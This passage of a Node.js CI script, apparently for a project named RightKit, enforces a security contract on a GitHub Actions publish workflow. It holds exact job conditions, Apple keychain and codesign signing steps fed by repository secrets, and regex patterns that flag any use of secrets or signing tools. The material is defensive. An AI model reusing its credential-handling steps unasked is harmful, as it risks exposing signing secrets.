#!/usr/bin/env node
// The security contract of .github/workflows/publish.yml, asserted on the PARSED workflow (not on
// text patterns) and proven by mutation: MUTATIONS lists edits that each break one property, and
// `proveMutations` fails if any edit still passes. plan runs this before it plans anything:
//   node scripts/ci/workflow-contract.mjs .github/workflows/publish.yml
import fs from "node:fs";
import { fileURLToPath } from "node:url";
import { parseYaml } from "./workflow-yaml.mjs";

export const VERIFY_HOSTS = ["windows-2025", "xcode-27"];
// Linux is a separate job, not a matrix leg: it verifies ONLY the units ci/linux-required.json lists (plan output
// linux_units) and exists only when the plan names one (linux_count != '0'). A required Linux row that is missing,
// partial or not a pass is refused by upload.mjs checkReceipts; qualified refuses a skipped or failed verify-linux
// whenever linux_count is not '0'.
export const LINUX_HOST_LABEL = "ubuntu-24.04";
export const PUBLISH_CONCURRENCY_GROUP = "qualification-${{ github.run_id }}";
// Conditions are compared as exact strings (after trimming), never matched by pattern: an appended
// `|| true`, a reordered operand or a different operator is a different condition.
// pack & verify must run only while the workflow is NOT cancelled (`!cancelled()`, never
// `always()`, which would continue a cancelled run) and only after each upstream job explicitly succeeded: a job whose
// condition has a status function other than the implicit success() runs after skipped upstream jobs (sign-swap is
// skipped for most runs), so a dropped result check is the dangerous case (it would let the job follow a failed or
// skipped one). The count test keeps an empty plan from running anything.
const RESULT_OK = (job) => `needs.${job}.result == 'success'`;
const COUNT_TERM = "needs.plan.outputs.count != '0'";
export const SWAP_OK_OR_SKIPPED = "((needs.plan.outputs.registry == 'npm' && contains(format(' {0} ', needs.plan.outputs.units), ' @rightkit/release ') && needs.build-swap.result == 'success' && needs.sign-swap.result == 'success') || ((needs.plan.outputs.registry != 'npm' || !contains(format(' {0} ', needs.plan.outputs.units), ' @rightkit/release ')) && needs.build-swap.result == 'skipped' && needs.sign-swap.result == 'skipped'))";
export const BUILD_CREDENTIALS_IF = "${{ needs.plan.outputs.count != '0' && needs.plan.outputs.registry == 'crates' && contains(format(' {0} ', needs.plan.outputs.units), ' rightkit-credentials ') }}";
export const SIGN_CREDENTIALS_IF = "${{ !cancelled() && needs.guard.result == 'success' && needs.plan.result == 'success' && needs.build-credentials-helper.result == 'success' && needs.plan.outputs.count != '0' && needs.plan.outputs.registry == 'crates' && contains(format(' {0} ', needs.plan.outputs.units), ' rightkit-credentials ') }}";
export const CREDENTIALS_OK_OR_SKIPPED = "((needs.plan.outputs.registry == 'crates' && contains(format(' {0} ', needs.plan.outputs.units), ' rightkit-credentials ') && needs.build-credentials-helper.result == 'success' && needs.sign-credentials-helper.result == 'success') || ((needs.plan.outputs.registry != 'crates' || !contains(format(' {0} ', needs.plan.outputs.units), ' rightkit-credentials ')) && needs.build-credentials-helper.result == 'skipped' && needs.sign-credentials-helper.result == 'skipped'))";
export const PACK_IF = `\${{ !cancelled() && ${RESULT_OK("guard")} && ${RESULT_OK("plan")} && ${COUNT_TERM} && ${SWAP_OK_OR_SKIPPED} }}`;
export const VERIFY_IF = `\${{ !cancelled() && ${RESULT_OK("guard")} && ${RESULT_OK("plan")} && ${RESULT_OK("pack")} && ${COUNT_TERM} && ${CREDENTIALS_OK_OR_SKIPPED} }}`;
export const LINUX_COUNT_TERM = "needs.plan.outputs.linux_count != '0'";
export const LINUX_IF = `\${{ !cancelled() && ${RESULT_OK("guard")} && ${RESULT_OK("plan")} && ${RESULT_OK("pack")} && ${COUNT_TERM} && ${LINUX_COUNT_TERM} }}`;
export const CHROME_IF = "${{ (needs.plan.outputs.registry == 'npm' && (contains(format(' {0} ', needs.plan.outputs.units), ' @rightkit/qa ') || contains(format(' {0} ', needs.plan.outputs.units), ' @rightkit/qa-chrome ') || contains(format(' {0} ', needs.plan.outputs.units), ' @rightkit/react-shell ') || contains(format(' {0} ', needs.plan.outputs.units), ' @rightkit/settings-ui ') || contains(format(' {0} ', needs.plan.outputs.units), ' @rightkit/onboarding '))) || (needs.plan.outputs.registry == 'crates' && contains(format(' {0} ', needs.plan.outputs.units), ' rightkit-browser ')) }}";
export const LINUX_CHROME_IF = CHROME_IF.replaceAll("needs.plan.outputs.units", "needs.plan.outputs.linux_units");
export const NPM_STEP_IF = "${{ needs.plan.outputs.registry == 'npm' }}";
export const CRATES_STEP_IF = "${{ needs.plan.outputs.registry == 'crates' }}";
export const TOKEN_ENV = { NODE_AUTH_TOKEN: "${{ secrets.NPM_TOKEN }}", CARGO_REGISTRY_TOKEN: "${{ secrets.CARGO_REGISTRY_TOKEN }}" };
const RT = "${{ runner.temp }}";
const PLAN_OUT = (name) => `\${{ needs.plan.outputs.${name} }}`;
export const PUBLISH_ENV = {
  PUBLISH_REGISTRY: PLAN_OUT("registry"), PUBLISH_UNITS: PLAN_OUT("units"), PUBLISH_ALLOW_HOST_EXCLUSION: PLAN_OUT("allow_host_exclusion"),
  PUBLISH_ALLOW_NO_TEST: PLAN_OUT("allow_no_test"), PUBLISH_ALLOW_IGNORED: PLAN_OUT("allow_ignored"), PUBLISH_ALLOW_MISSING_ASSETS: PLAN_OUT("allow_missing_assets"),
};
export const ALL_JOBS = ["guard", "plan", "build-swap", "sign-swap", "build-credentials-helper", "sign-credentials-helper", "pack", "verify", "verify-linux", "qualified"];
export const QUALIFIED_RUN = 'test "$GUARD_RESULT" = success\ntest "$PLAN_RESULT" = success\ntest "$PACK_RESULT" = success\ntest "$VERIFY_RESULT" = success\ntest "$UNIT_COUNT" -gt 0\ntest "$LINUX_COUNT" -ge 0\ntest "$VERIFY_LINUX_RESULT" = "$LINUX_EXPECTED_RESULT"\n';
export const QUALIFIED_ENV = { GUARD_RESULT: "${{ needs.guard.result }}", PLAN_RESULT: "${{ needs.plan.result }}", PACK_RESULT: "${{ needs.pack.result }}", VERIFY_RESULT: "${{ needs.verify.result }}", VERIFY_LINUX_RESULT: "${{ needs.verify-linux.result }}", UNIT_COUNT: "${{ needs.plan.outputs.count }}", LINUX_COUNT: "${{ needs.plan.outputs.linux_count }}", LINUX_EXPECTED_RESULT: "${{ needs.plan.outputs.linux_count != '0' && 'success' || 'skipped' }}" };
// sign-swap signs one binary (rightkit-swap) for @rightkit/release. It is the only qualification job that may use an
// environment or the secrets context, and then only the three Apple identity secrets, in exactly one step; the build
// builder runs on a separate secretless runner. pack stays secretless & only downloads signed result.
export const BUILD_SWAP_IF = "${{ needs.plan.outputs.count != '0' && needs.plan.outputs.registry == 'npm' && contains(format(' {0} ', needs.plan.outputs.units), ' @rightkit/release ') }}";
export const SIGN_SWAP_IF = "${{ !cancelled() && needs.guard.result == 'success' && needs.plan.result == 'success' && needs.build-swap.result == 'success' && needs.plan.outputs.count != '0' && needs.plan.outputs.registry == 'npm' && contains(format(' {0} ', needs.plan.outputs.units), ' @rightkit/release ') }}";
export const UNSIGNED_SEAL_RUN = "set -euo pipefail\nout=\"$RUNNER_TEMP/swap-unsigned\"\nmkdir -p \"$out\"\ncp target/release/rightkit-swap \"$out/rightkit-swap\"\n(cd \"$out\" && shasum -a 256 rightkit-swap > rightkit-swap.sha256)\nprintf 'repository=%s\\nsource=%s\\nrun=%s\\nattempt=%s\\nworkflow=%s\\nhost=%s\\narch=%s\\njob=build-swap\\n' \"$GITHUB_REPOSITORY\" \"$GITHUB_SHA\" \"$GITHUB_RUN_ID\" \"$GITHUB_RUN_ATTEMPT\" \"$GITHUB_WORKFLOW_REF\" \"$RUNNER_OS\" \"$RUNNER_ARCH\" > \"$out/source-receipt.txt\"\ncat \"$out/rightkit-swap.sha256\" >> \"$out/source-receipt.txt\"\nprintf 'sha256=%s\\n' \"$(cut -d ' ' -f 1 \"$out/rightkit-swap.sha256\")\" >> \"$GITHUB_OUTPUT\"\n";
export const UNSIGNED_VALIDATE_RUN = "set -euo pipefail\nin=\"$RUNNER_TEMP/swap-unsigned\"\n[[ \"$EXPECTED_SHA256\" =~ ^[0-9a-f]{64}$ ]]\nshopt -s dotglob nullglob\nfiles=(\"$in\"/*)\ntest \"${#files[@]}\" -eq 3\nfor file in rightkit-swap rightkit-swap.sha256 source-receipt.txt; do\n  test -f \"$in/$file\"\n  test ! -L \"$in/$file\"\ndone\nprintf '%s  rightkit-swap\\n' \"$EXPECTED_SHA256\" > \"$RUNNER_TEMP/expected-swap.sha256\"\ncmp \"$RUNNER_TEMP/expected-swap.sha256\" \"$in/rightkit-swap.sha256\"\nprintf 'repository=%s\\nsource=%s\\nrun=%s\\nattempt=%s\\nworkflow=%s\\nhost=%s\\narch=%s\\njob=build-swap\\n' \"$GITHUB_REPOSITORY\" \"$GITHUB_SHA\" \"$GITHUB_RUN_ID\" \"$GITHUB_RUN_ATTEMPT\" \"$GITHUB_WORKFLOW_REF\" \"$RUNNER_OS\" \"$RUNNER_ARCH\" > \"$RUNNER_TEMP/expected-swap-receipt.txt\"\ncat \"$RUNNER_TEMP/expected-swap.sha256\" >> \"$RUNNER_TEMP/expected-swap-receipt.txt\"\ncmp \"$RUNNER_TEMP/expected-swap-receipt.txt\" \"$in/source-receipt.txt\"\n(cd \"$in\" && shasum -a 256 -c rightkit-swap.sha256)\n";
export const SIGN_IDENTITY_RUN = "set -euo pipefail\ncertificate_path=\"$RUNNER_TEMP/apple-signing.p12\"\nkeychain_path=\"$RUNNER_TEMP/apple-signing.keychain-db\"\nprintf '%s' \"$APPLE_CERTIFICATE_BASE64\" | base64 --decode > \"$certificate_path\"\nsecurity create-keychain -p \"$APPLE_KEYCHAIN_PASSWORD\" \"$keychain_path\"\nsecurity set-keychain-settings -lut 21600 \"$keychain_path\"\nsecurity unlock-keychain -p \"$APPLE_KEYCHAIN_PASSWORD\" \"$keychain_path\"\nsecurity import \"$certificate_path\" -P \"$APPLE_CERTIFICATE_PASSWORD\" -A -t cert -f pkcs12 -k \"$keychain_path\"\nsecurity set-key-partition-list -S apple-tool:,apple: -k \"$APPLE_KEYCHAIN_PASSWORD\" \"$keychain_path\"\nsecurity list-keychain -d user -s \"$keychain_path\"\nrm -f \"$certificate_path\"\n";
export const SIGN_HELPER_RUN = "set -euo pipefail\nout=\"$RUNNER_TEMP/swap-signed\"\nrm -rf \"$out\" && mkdir -p \"$out\"\ncp \"$RUNNER_TEMP/swap-unsigned/rightkit-swap\" \"$out/rightkit-swap\"\ncp \"$RUNNER_TEMP/swap-unsigned/source-receipt.txt\" \"$out/unsigned-source-receipt.txt\"\ncodesign --force --strict --options runtime --timestamp --sign \"$APPLE_DEVELOPER_ID\" \"$out/rightkit-swap\"\ncodesign --verify --strict --verbose=2 \"$out/rightkit-swap\"\ndetails=\"$(codesign -dvv \"$out/rightkit-swap\" 2>&1)\"\nprintf '%s\\n' \"$details\"\nprintf '%s\\n' \"$details\" | grep -q 'Authority=Developer ID Application'\nprintf '%s\\n' \"$details\" | grep -Eq 'flags=0x[0-9a-f]+\\(.*runtime'\n(cd \"$out\" && shasum -a 256 rightkit-swap > rightkit-swap.sha256 && cat rightkit-swap.sha256)\nprintf 'repository=%s\\nsource=%s\\nrun=%s\\nattempt=%s\\nworkflow=%s\\nhost=%s\\narch=%s\\njob=sign-swap\\n' \"$GITHUB_REPOSITORY\" \"$GITHUB_SHA\" \"$GITHUB_RUN_ID\" \"$GITHUB_RUN_ATTEMPT\" \"$GITHUB_WORKFLOW_REF\" \"$RUNNER_OS\" \"$RUNNER_ARCH\" > \"$out/source-receipt.txt\"\ncat \"$out/rightkit-swap.sha256\" >> \"$out/source-receipt.txt\"\n{ echo '### rightkit-swap (Developer ID signed)'; echo '```'; cat \"$out/rightkit-swap.sha256\"; echo '```'; } >> \"$GITHUB_STEP_SUMMARY\"\n";
export const SIGN_CLEANUP_RUN = "keychain_path=\"$RUNNER_TEMP/apple-signing.keychain-db\"\nsecurity delete-keychain \"$keychain_path\" || true\nrm -f \"$RUNNER_TEMP/apple-signing.p12\"\n";
export const UNSIGNED_ARTIFACT = "rightkit-swap-unsigned-${{ github.run_attempt }}";
export const SIGN_SWAP_SECRETS = {
  APPLE_CERTIFICATE_BASE64: "${{ secrets.APPLE_CERTIFICATE_BASE64 }}",
  APPLE_CERTIFICATE_PASSWORD: "${{ secrets.APPLE_CERTIFICATE_PASSWORD }}",
  APPLE_KEYCHAIN_PASSWORD: "${{ secrets.APPLE_KEYCHAIN_PASSWORD }}",
};
export const SIGN_SWAP_ARTIFACT = "rightkit-swap-signed";
const PACK_SWAP_STEP_IF = "${{ needs.sign-swap.result == 'success' }}";
// build-credentials-helper compiles the isolated macOS qualification helper (RightKitCredentialsQualification)
// from pinned Swift sources on a secretless runner; sign-credentials-helper embeds the release-environment
// provisioning profile and Developer ID signs it. verify (macOS leg only) downloads the same-run signed
// artifact, re-checks its receipt and tree digest through provision-credentials-helper-env.mjs, and exports
// RK_SOURCE_HELPER_APP/RK_CONSUMER_HELPER_NAME/RK_CONSUMER_HELPER_TEAM_ID. No new signing protocol: the
// identity import, codesign argv, strict verify and receipt binding mirror sign-swap exactly.
export const CREDENTIALS_VERIFY_STEP_IF = "${{ needs.sign-credentials-helper.result == 'success' && runner.os == 'macOS' }}";
export const CREDENTIALS_HELPER_ENV = {
  RK_SOURCE_HELPER_APP: "${{ env.RK_SOURCE_HELPER_APP }}",
  RK_CONSUMER_HELPER_NAME: "${{ env.RK_CONSUMER_HELPER_NAME }}",
  RK_CONSUMER_HELPER_TEAM_ID: "${{ env.RK_CONSUMER_HELPER_TEAM_ID }}",
};
// Exact pinned sources of the qualification helper (ci/consumers/rightkit-credentials/qualification-helper/README.md):
// five Swift files at this commit, verified by git blob SHA-1 at build time, plus the three committed fixture
// files (main.swift, Info.plist, entitlements.plist) from the dispatched checkout.
export const CREDENTIALS_HELPER_SOURCE_COMMIT = "8f38ac109e09b182b0e5c0f4e365606a3522f45b";
export const CREDENTIALS_HELPER_SOURCE_PREFIX = "swift/RightKitSwift/Sources/RightKitAppleCredentials";
const CREDENTIALS_HELPER_SOURCE_BLOBS = [
  ["AppleCredentialHelperHost.swift", "e9f6aff167f9219eab465fa4d87f9bcc992bee07"],
  ["ForeignGenericPassword.swift", "19b29a3d71663736fe481873e4490c53d0c4f27a"],
  ["RightKitAppleCredentials.swift", "a4c53c429961eb187000a1f8151662ec4c529e26"],
  ["SyncedCredentialPolicy.swift", "e1e3d9bc136c40ebccc13acb910f0bd009b56ca9"],
  ["SyncedEnvelopeStore.swift", "fd45199d5ff0846712e05e4d833c9f60acd7a5b9"],
];
const CREDENTIALS_HELPER_SYNTH =
  "xcrun swiftc -swift-version 6 -target \"$(uname -m)-apple-macosx14.0\"";
export const CREDENTIALS_BUILD_RUN = [
  "set -euo pipefail",
  "out=\"$RUNNER_TEMP/credentials-helper-unsigned\"",
  "stage=\"$out/stage\"",
  "rm -rf \"$out\" && mkdir -p \"$stage/source\" \"$out/RightKitCredentialsQualification.app/Contents/MacOS\"",
  `commit="${CREDENTIALS_HELPER_SOURCE_COMMIT}"`,
  ...CREDENTIALS_HELPER_SOURCE_BLOBS.flatMap(([name, blob]) => [
    `git show "$commit:${CREDENTIALS_HELPER_SOURCE_PREFIX}/${name}" > "$stage/source/${name}"`,
    `test "$(git hash-object "$stage/source/${name}")" = "${blob}"`,
  ]),
  "fixture=\"ci/consumers/rightkit-credentials/qualification-helper\"",
  "cp \"$GITHUB_WORKSPACE/$fixture/main.swift\" \"$GITHUB_WORKSPACE/$fixture/Info.plist\" \"$GITHUB_WORKSPACE/$fixture/entitlements.plist\" \"$stage/source/\"",
  "mkdir -p \"$stage/module-cache\"",
  "export CLANG_MODULE_CACHE_PATH=\"$stage/module-cache\"",
  `${CREDENTIALS_HELPER_SYNTH} -module-cache-path "$stage/module-cache" -parse-as-library -emit-library -static -emit-module -module-name RightKitAppleCredentials -emit-module-path "$stage/RightKitAppleCredentials.swiftmodule" "$stage/source/AppleCredentialHelperHost.swift" "$stage/source/ForeignGenericPassword.swift" "$stage/source/RightKitAppleCredentials.swift" "$stage/source/SyncedCredentialPolicy.swift" "$stage/source/SyncedEnvelopeStore.swift" -o "$stage/libRightKitAppleCredentials.a"`,
  `${CREDENTIALS_HELPER_SYNTH} -module-cache-path "$stage/module-cache" -I "$stage" -L "$stage" -lRightKitAppleCredentials "$stage/source/main.swift" -o "$out/RightKitCredentialsQualification.app/Contents/MacOS/RightKitCredentialsQualification"`,
  "cp \"$stage/source/Info.plist\" \"$out/RightKitCredentialsQualification.app/Contents/Info.plist\"",
  "python3 - \"$stage\" \"$out\" <<'PY'",
  "import hashlib",
  "import json",
  "import sys",
  `records = [{"name": "git-commit", "commit": "${CREDENTIALS_HELPER_SOURCE_COMMIT}"}]`,
  "for name in [\"AppleCredentialHelperHost.swift\", \"ForeignGenericPassword.swift\", \"RightKitAppleCredentials.swift\", \"SyncedCredentialPolicy.swift\", \"SyncedEnvelopeStore.swift\", \"main.swift\", \"Info.plist\", \"entitlements.plist\"]:",
  "    with open(sys.argv[1] + \"/source/\" + name, \"rb\") as stream:",
  "        data = stream.read()",
  "    records.append({\"name\": name, \"sha256\": hashlib.sha256(data).hexdigest()})",
  "with open(sys.argv[2] + \"/source-inputs.json\", \"w\") as stream:",
  "    stream.write(json.dumps({\"schema\": 1, \"files\": records}, indent=2) + \"\\n\")",
  "PY",
].join("\n") + "\n";
export const CREDENTIALS_SEAL_RUN = "set -euo pipefail\nout=\"$RUNNER_TEMP/credentials-helper-unsigned\"\nbin=\"$out/RightKitCredentialsQualification.app/Contents/MacOS/RightKitCredentialsQualification\"\ntest -f \"$bin\"\ncp \"$out/stage/source/entitlements.plist\" \"$out/entitlements.plist\"\nrm -rf \"$out/stage\"\nchmod 0755 \"$bin\"\n(cd \"$(dirname \"$bin\")\" && shasum -a 256 RightKitCredentialsQualification > \"$out/helper.sha256\")\nprintf 'repository=%s\\nsource=%s\\nrun=%s\\nattempt=%s\\nworkflow=%s\\nhost=%s\\narch=%s\\njob=build-credentials-helper\\n' \"$GITHUB_REPOSITORY\" \"$GITHUB_SHA\" \"$GITHUB_RUN_ID\" \"$GITHUB_RUN_ATTEMPT\" \"$GITHUB_WORKFLOW_REF\" \"$RUNNER_OS\" \"$RUNNER_ARCH\" > \"$out/source-receipt.txt\"\ncat \"$out/helper.sha256\" >> \"$out/source-receipt.txt\"\nprintf 'sha256=%s\\n' \"$(cut -d ' ' -f 1 \"$out/helper.sha256\")\" >> \"$GITHUB_OUTPUT\"\n";
export const CREDENTIALS_VALIDATE_RUN = "set -euo pipefail\nin=\"$RUNNER_TEMP/credentials-helper-unsigned\"\n[[ \"$EXPECTED_SHA256\" =~ ^[0-9a-f]{64}$ ]]\nshopt -s dotglob nullglob\nfiles=(\"$in\"/*)\ntest \"${#files[@]}\" -eq 5\nfor file in RightKitCredentialsQualification.app helper.sha256 source-receipt.txt source-inputs.json entitlements.plist; do\n  test -e \"$in/$file\"\n  test ! -L \"$in/$file\"\ndone\ntest -f \"$in/RightKitCredentialsQualification.app/Contents/MacOS/RightKitCredentialsQualification\"\ntest -f \"$in/RightKitCredentialsQualification.app/Contents/Info.plist\"\ntest ! -e \"$in/RightKitCredentialsQualification.app/Contents/embedded.provisionprofile\"\nprintf '%s  RightKitCredentialsQualification\\n' \"$EXPECTED_SHA256\" > \"$RUNNER_TEMP/expected-credentials-helper.sha256\"\ncmp \"$RUNNER_TEMP/expected-credentials-helper.sha256\" \"$in/helper.sha256\"\nprintf 'repository=%s\\nsource=%s\\nrun=%s\\nattempt=%s\\nworkflow=%s\\nhost=%s\\narch=%s\\njob=build-credentials-helper\\n' \"$GITHUB_REPOSITORY\" \"$GITHUB_SHA\" \"$GITHUB_RUN_ID\" \"$GITHUB_RUN_ATTEMPT\" \"$GITHUB_WORKFLOW_REF\" \"$RUNNER_OS\" \"$RUNNER_ARCH\" > \"$RUNNER_TEMP/expected-credentials-helper-receipt.txt\"\ncat \"$RUNNER_TEMP/expected-credentials-helper.sha256\" >> \"$RUNNER_TEMP/expected-credentials-helper-receipt.txt\"\ncmp \"$RUNNER_TEMP/expected-credentials-helper-receipt.txt\" \"$in/source-receipt.txt\"\n(cd \"$in/RightKitCredentialsQualification.app/Contents/MacOS\" && shasum -a 256 -c \"$in/helper.sha256\")\n";
export const CREDENTIALS_SIGN_RUN = [
  "set -euo pipefail",
  "in=\"$RUNNER_TEMP/credentials-helper-unsigned\"",
  "out=\"$RUNNER_TEMP/credentials-helper-signed\"",
  "rm -rf \"$out\" && mkdir -p \"$out\"",
  "profile=\"$RUNNER_TEMP/credentials-qual.mobileprovision\"",
  "printf '%s' \"$APPLE_CREDENTIALS_QUAL_PROFILE_BASE64\" | base64 --decode > \"$profile\"",
  "identity_hash=\"$(security find-identity -v -p codesigning \"$RUNNER_TEMP/apple-signing.keychain-db\" | awk '/Developer ID Application/ {print $2; exit}')\"",
  "[[ \"$identity_hash\" =~ ^[0-9A-F]{40}$ ]]",
  "python3 - \"$profile\" \"$identity_hash\" <<'PY'",
  "import datetime",
  "import hashlib",
  "import plistlib",
  "import subprocess",
  "import sys",
  "team = \"6KLGD3LLKF\"",
  "identifier = \"org.rightkit.qualification.credentials\"",
  "profile, identity_hash = sys.argv[1], sys.argv[2].upper()",
  "raw = subprocess.run([\"security\", \"cms\", \"-D\", \"-i\", profile], check=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL).stdout",
  "data = plistlib.loads(raw)",
  "entitlements = data.get(\"Entitlements\", {})",
  "expected = team + \".\" + identifier",
  "app_id = entitlements.get(\"com.apple.application-identifier\", entitlements.get(\"application-identifier\"))",
  "if app_id != expected and not (isinstance(app_id, str) and app_id.startswith(team + \".\") and app_id.endswith(\"*\") and \"*\" not in app_id[:-1] and expected.startswith(app_id[:-1])):",
  "    raise SystemExit(\"profile application-identifier mismatch\")",
  "groups = entitlements.get(\"keychain-access-groups\")",
  "def authorized(group):",
  "    if group == expected:",
  "        return True",
  "    return isinstance(group, str) and group.startswith(team + \".\") and group.endswith(\"*\") and \"*\" not in group[:-1] and expected.startswith(group[:-1])",
  "if not isinstance(groups, list) or not any(authorized(group) for group in groups):",
  "    raise SystemExit(\"profile keychain-access-groups mismatch\")",
  "if team not in data.get(\"TeamIdentifier\", []):",
  "    raise SystemExit(\"profile team mismatch\")",
  "platforms = data.get(\"Platform\", [])",
  "if not platforms or any(platform not in (\"OSX\", \"macOS\") for platform in platforms):",
  "    raise SystemExit(\"profile platform mismatch\")",
  "expiry = data.get(\"ExpirationDate\")",
  "if expiry is None:",
  "    raise SystemExit(\"profile expiry missing\")",
  "if expiry.tzinfo is None:",
  "    expiry = expiry.replace(tzinfo=datetime.timezone.utc)",
  "if datetime.datetime.now(datetime.timezone.utc) >= expiry:",
  "    raise SystemExit(\"profile expired\")",
  "if entitlements.get(\"get-task-allow\", False) is not False:",
  "    raise SystemExit(\"profile must disable debugging\")",
  "fingerprints = {hashlib.sha1(certificate).hexdigest().upper() for certificate in data.get(\"DeveloperCertificates\", [])}",
  "if identity_hash not in fingerprints:",
  "    raise SystemExit(\"profile does not authorize the signing identity\")",
  "PY",
  "cp -R \"$in/RightKitCredentialsQualification.app\" \"$out/\"",
  "cp \"$profile\" \"$out/RightKitCredentialsQualification.app/Contents/embedded.provisionprofile\"",
  "cp \"$in/source-receipt.txt\" \"$out/unsigned-source-receipt.txt\"",
  "cp \"$in/entitlements.plist\" \"$out/entitlements.plist\"",
  "cp \"$in/source-inputs.json\" \"$out/source-inputs.json\"",
  "codesign --force --strict --options runtime --timestamp --entitlements \"$in/entitlements.plist\" --sign \"$APPLE_DEVELOPER_ID\" \"$out/RightKitCredentialsQualification.app\"",
  "codesign --verify --strict --verbose=2 \"$out/RightKitCredentialsQualification.app\"",
  "details=\"$(codesign -dvv \"$out/RightKitCredentialsQualification.app\" 2>&1)\"",
  "printf '%s\\n' \"$details\"",
  "printf '%s\\n' \"$details\" | grep -q 'Authority=Developer ID Application'",
  "printf '%s\\n' \"$details\" | grep -q 'TeamIdentifier=6KLGD3LLKF'",
  "printf '%s\\n' \"$details\" | grep -q 'Identifier=org.rightkit.qualification.credentials'",
  "printf '%s\\n' \"$details\" | grep -Eq 'flags=0x[0-9a-f]+\\(.*runtime'",
  "python3 - \"$out/RightKitCredentialsQualification.app\" <<'PY'",
  "import plistlib",
  "import subprocess",
  "import sys",
  "result = subprocess.run([\"codesign\", \"-d\", \"--entitlements\", \":-\", sys.argv[1]], check=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)",
  "entitlements = plistlib.loads(result.stdout)",
  "if entitlements != {\"keychain-access-groups\": [\"6KLGD3LLKF.org.rightkit.qualification.credentials\"]}:",
  "    raise SystemExit(\"signed helper must carry only its isolated access group\")",
  "PY",
  "bin=\"$out/RightKitCredentialsQualification.app/Contents/MacOS/RightKitCredentialsQualification\"",
  "(cd \"$(dirname \"$bin\")\" && shasum -a 256 RightKitCredentialsQualification > \"$out/helper.sha256\" && cat \"$out/helper.sha256\")",
  "printf 'repository=%s\\nsource=%s\\nrun=%s\\nattempt=%s\\nworkflow=%s\\nhost=%s\\narch=%s\\njob=sign-credentials-helper\\n' \"$GITHUB_REPOSITORY\" \"$GITHUB_SHA\" \"$GITHUB_RUN_ID\" \"$GITHUB_RUN_ATTEMPT\" \"$GITHUB_WORKFLOW_REF\" \"$RUNNER_OS\" \"$RUNNER_ARCH\" > \"$out/source-receipt.txt\"",
  "cat \"$out/helper.sha256\" >> \"$out/source-receipt.txt\"",
  "{ echo '### RightKitCredentialsQualification (Developer ID signed)'; echo '```'; cat \"$out/helper.sha256\"; echo '```'; } >> \"$GITHUB_STEP_SUMMARY\"",
].join("\n") + "\n";
export const CREDENTIALS_CLEANUP_RUN = "keychain_path=\"$RUNNER_TEMP/apple-signing.keychain-db\"\nsecurity delete-keychain \"$keychain_path\" || true\nrm -f \"$RUNNER_TEMP/apple-signing.p12\" \"$RUNNER_TEMP/credentials-qual.mobileprovision\"\n";
export const UNSIGNED_CREDENTIALS_ARTIFACT = "rightkit-credentials-helper-unsigned-${{ github.run_attempt }}";
export const SIGN_CREDENTIALS_SECRETS = {
  APPLE_CERTIFICATE_BASE64: "${{ secrets.APPLE_CERTIFICATE_BASE64 }}",
  APPLE_CERTIFICATE_PASSWORD: "${{ secrets.APPLE_CERTIFICATE_PASSWORD }}",
  APPLE_KEYCHAIN_PASSWORD: "${{ secrets.APPLE_KEYCHAIN_PASSWORD }}",
  APPLE_CREDENTIALS_QUAL_PROFILE_BASE64: "${{ secrets.APPLE_CREDENTIALS_QUAL_PROFILE_BASE64 }}",
};
export const SIGN_CREDENTIALS_ARTIFACT = "rightkit-credentials-helper-signed";
// The licence gate (rightkit#264) lives in plan, which every later job needs, so nothing can pack or upload past a failure.
export const DENY_IF = "${{ inputs.registry == 'crates' && contains(format(' {0} ', steps.plan.outputs.units), ' rightkit-typeset ') }}";
export const DENY_TOOL = "cargo-deny@0.20.2";
export const DENY_RUN = "cargo deny --manifest-path crates/rightkit-typeset/Cargo.toml check --config deny.toml licenses";
const PLAN_ALLOWED_ACTIONS = ["actions/checkout@", "actions/setup-node@", "dtolnay/rust-toolchain@", "taiki-e/install-action@"];
// Native Windows OpenSSL for the SQLCipher system-crypto dependent checks of a crates run (rightkit-db,
// rightkit-credentials). verify runs the same committed scripts rk-setup runs for shared CI, only for crates on
// Windows, before the gate, in exactly these two steps: no env, no inputs, no secrets, no other shell or script.
export const WIN_OPENSSL_IF = "${{ needs.plan.outputs.registry == 'crates' && runner.os == 'Windows' }}";
export const WIN_OPENSSL_STEPS = [
  ["Select native Windows Perl for vendored OpenSSL", '& "$env:GITHUB_WORKSPACE/scripts/ci/select-native-perl.ps1"'],
  ["Locate native Windows OpenSSL for SQLCipher system crypto", '& "$env:GITHUB_WORKSPACE/scripts/ci/locate-native-openssl.ps1"'],
];
const SIGNING_TOOLS = /\b(?:codesign|notarytool|security\s+(?:import|create-keychain|unlock-keychain|set-key-partition-list)|cargo\b)/;

const same = (a, b) => JSON.stringify(a) === JSON.stringify(b);
const sorted = (list) => [...list].sort();
// pack builds only the planned units and their workspace dependency closure (publish.mjs build), never the whole workspace.
export const PACK_BUILD_RUN = "node scripts/ci/publish.mjs build";
const stepsOf = (job) => (Array.isArray(job?.steps) ? job.steps : []);
const needsOf = (job) => (Array.isArray(job?.needs) ? job.needs : job?.needs ? [job.needs] : []);

function findKey(value, key, trail = "") {
  const hits = [];
  if (Array.isArray(value)) value.forEach((v, i) => hits.push(...findKey(v, key, `${trail}[${i}]`)));
  else if (value && typeof value === "object") {
    for (const [k, v] of Object.entries(value)) { if (k === key) hits.push(`${trail}.${k}`); hits.push(...findKey(v, key, `${trail}.${k}`)); }
  }
  return hits;
}

/**
 * Every place a string value or a KEY in `value` matches `pattern`. Context names are case-insensitive
 * and cannot be built dynamically, so one word-match on `secrets` finds every expression form:
 * secrets.NAME, secrets['NAME'], secrets["NAME"], toJSON(secrets), a bare `secrets`, ${{ secrets }} at
 * workflow, job or step level, and the `secrets: inherit` key.
 */
export function findMatches(value, pattern, trail = "") {
  const hits = [];
  if (typeof value === "string") { if (pattern.test(value)) hits.push({ path: trail, text: value }); }
  else if (Array.isArray(value)) value.forEach((v, i) => hits.push(...findMatches(v, pattern, `${trail}[${i}]`)));
  else if (value && typeof value === "object") {
    for (const [k, v] of Object.entries(value)) {
      if (pattern.test(k)) hits.push({ path: `${trail}.${k}`, text: k });
      hits.push(...findMatches(v, pattern, `${trail}.${k}`));
    }
  }
  return hits;
}
export const SECRET_PATTERN = /\bsecrets\b/i;
export const ID_TOKEN_PATTERN = /id-token/i;

/** Throws one Error listing every violated property. `doc` is parseYaml output. */
export function assertPublishDoc(doc, name = "publish.yml") {
  const problems = [];
  const check = (ok, message) => { if (!ok) problems.push(message); };
  const jobs = doc?.jobs ?? {};

  // Triggers and ambient authority.
